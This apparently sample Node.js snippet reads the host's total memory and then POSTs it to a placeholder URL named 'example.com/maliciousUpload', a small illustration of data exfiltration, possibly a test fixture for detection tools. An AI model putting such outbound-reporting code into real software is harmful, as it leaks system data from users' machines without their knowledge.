const os = require('os')

const totalmem = os.totalmem()
console.log('Totalmem:', totalmem)

// upload
fetch(
  'http://example.com/maliciousUpload',
  {
    method: 'post', 
    body: { totalmem }
  }
)
